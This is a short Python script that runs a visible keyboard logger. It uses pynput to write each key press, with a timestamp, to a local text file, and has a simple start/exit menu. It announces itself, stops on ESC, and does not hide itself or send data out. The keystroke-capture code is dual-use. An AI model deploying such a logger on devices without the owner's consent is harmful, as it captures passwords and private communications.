from pynput import keyboard
from itertools import product
from datetime import datetime

LOG_FILE = "keystrokes_log.txt"

def format_key(key):
    try:
        if hasattr(key, 'char') and key.char is not None:
            return key.char
        else:
            return f"[{key.name}]"
    except AttributeError:
        return "[UNKNOWN_KEY]"


def key_pressed(key):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    formatted_key = format_key(key)
    log_entry = f"{timestamp} - {formatted_key}\n"

    with open(LOG_FILE, "a", encoding="utf-8") as file:
        file.write(log_entry)

    # Stop logger if ESC is pressed
    if key == keyboard.Key.esc:
        print("ESC pressed. Stopping logger...")
        return False


def start_logger():
    print("Keyboard logger started.")
    print("Press ESC to stop.\n")

    with keyboard.Listener(on_press=key_pressed) as listener:
        listener.join()

    print("Logger stopped.")

def main():
    while True:
        print("1. Start Keyboard Logger")
        print("2. Exit")

        choice = input("Select option: ")

        if choice == "1":
            start_logger()
        elif choice == "2":
            print("Exiting program.")
            break
        else:
            print("Invalid choice. Try again.")


if __name__ == "__main__":
    main()
